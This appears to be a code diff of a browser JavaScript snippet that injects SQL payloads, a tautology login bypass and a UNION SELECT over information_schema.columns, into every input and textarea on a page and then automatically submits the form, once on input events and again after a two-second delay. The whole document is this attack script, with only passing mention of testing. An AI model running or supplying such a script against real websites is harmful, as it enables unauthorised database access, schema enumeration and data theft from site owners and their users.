@@ -1,37 +1,36 @@
 (function() {
+  // Log to confirm the script is running
+  console.log("SQL Injection script running...");
+
+  // SQL payloads to test
   const sqlPayloads = [
-    "' OR 'a'='a",
-    "' UNION SELECT table_name, column_name FROM information_schema.columns --" 
+    "' OR 'a'='a",  // First payload
+    "' UNION SELECT table_name, column_name FROM information_schema.columns --"  // Second payload
   ];
 
+  // Select the input fields and set values
   const formInputs = document.querySelectorAll('input, textarea');
+  
   formInputs.forEach(input => {
-    // Insert SQL injection into the input field
+    console.log(`Injecting payload into input: ${input.name || input.id}`);
     input.value = sqlPayloads[0];  // Use the first payload from the array
 
-    // Add event listener for form submission to prevent page reload
+    // Add event listener to handle form submission
+    input.addEventListener('input', function() {
+      const form = document.querySelector('form');
+      if (form) {
+        console.log("Form found, submitting...");
+        form.submit();  // Submit the form after injection
+      }
+    });
+  });
+
+  // Optionally, you can set a timeout to execute after a delay
+  setTimeout(() => {
     const form = document.querySelector('form');
     if (form) {
-      form.addEventListener('submit', (event) => {
-        event.preventDefault();  // Prevent page reload
-        console.log('Form submitted with SQL payload:', input.value);
-
-        // You could use AJAX to send the form data and get the response without reloading the page
-        // Example (make sure to adapt the endpoint and parameters):
-        fetch(form.action, {
-          method: 'POST',
-          body: new URLSearchParams(new FormData(form)),
-        }).then(response => {
-          return response.text();  // Or response.json() if the response is JSON
-        }).then(data => {
-          console.log('Server response:', data);
-          // You can display this data on the page or handle it as needed
-        }).catch(error => {
-          console.error('Error during SQL Injection test:', error);
-        });
-      });
-
-      form.submit();  // Submit the form to trigger the SQL injection
+      console.log("Submitting form after timeout...");
+      form.submit();
     }
-  });
+  }, 2000);  // Delay in milliseconds (2 seconds)
 })();
